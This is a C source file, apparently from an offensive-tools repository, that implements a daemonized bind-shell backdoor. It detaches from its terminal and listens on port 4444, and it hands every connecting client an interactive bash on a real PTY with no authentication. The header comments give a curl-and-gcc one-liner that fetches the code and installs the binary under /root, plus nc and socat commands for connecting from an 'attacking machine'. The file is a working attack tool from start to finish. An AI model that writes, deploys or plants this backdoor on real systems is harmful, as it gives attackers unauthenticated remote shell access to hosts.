//
// curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/BashReverso.c > /tmp/BashReverso.c; gcc /tmp/BashReverso.c -o /root/BashReverso
//
// Conectarse desde la máquina atacante:
//
//  Con netcat (no es una terminal completa porque no se puede navegar por midnight commander):
//    nc 192.168.1.100 4444
//  Con socat:
//    socat file:`tty`,raw,echo=0 TCP:192.168.1.100:4444

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <pty.h>
#include <utmp.h>
#include <string.h>

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    if (setsid() < 0) exit(1);
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    int fd = open("/dev/null", O_RDWR);
    if (fd >= 0) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        close(fd);
    }

    chdir("/");
    umask(0);
}

int main() {
    daemonize();

    int sockfd, clientfd;
    struct sockaddr_in server_addr;
    int master_fd, slave_fd;
    pid_t pid;
    char *bash_shell[] = {"/bin/bash", "-i", NULL};
    char *envp[] = {"TERM=xterm", "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) exit(1);

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(4444);

    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) exit(1);
    if (listen(sockfd, 1) < 0) exit(1);

    while (1) {
        clientfd = accept(sockfd, NULL, NULL);
        if (clientfd < 0) continue;

        if (openpty(&master_fd, &slave_fd, NULL, NULL, NULL) < 0) exit(1);

        pid = fork();
        if (pid == 0) {  // Proceso hijo: ejecuta bash con un PTY real
            close(sockfd);
            close(master_fd);

            // Asociar el PTY a la sesión para que Bash lo reconozca como una terminal real
            login_tty(slave_fd);

            // Ejecutar Bash con entorno configurado
            execve("/bin/bash", bash_shell, envp);
            exit(0);
        }

        close(slave_fd);

        // Redirigir datos entre el atacante y la shell
        char buffer[1024];
        ssize_t n;
        fd_set fds;

        while (1) {
            FD_ZERO(&fds);
            FD_SET(clientfd, &fds);
            FD_SET(master_fd, &fds);

            int max_fd = (clientfd > master_fd ? clientfd : master_fd) + 1;
            int activity = select(max_fd, &fds, NULL, NULL, NULL);
            if (activity < 0) break;

            if (FD_ISSET(clientfd, &fds)) {
                n = read(clientfd, buffer, sizeof(buffer));
                if (n <= 0) break;
                write(master_fd, buffer, n);
            }

            if (FD_ISSET(master_fd, &fds)) {
                n = read(master_fd, buffer, sizeof(buffer));
                if (n <= 0) break;
                write(clientfd, buffer, n);
            }
        }

        close(master_fd);
        close(clientfd);
    }

    close(sockfd);
    return 0;
}
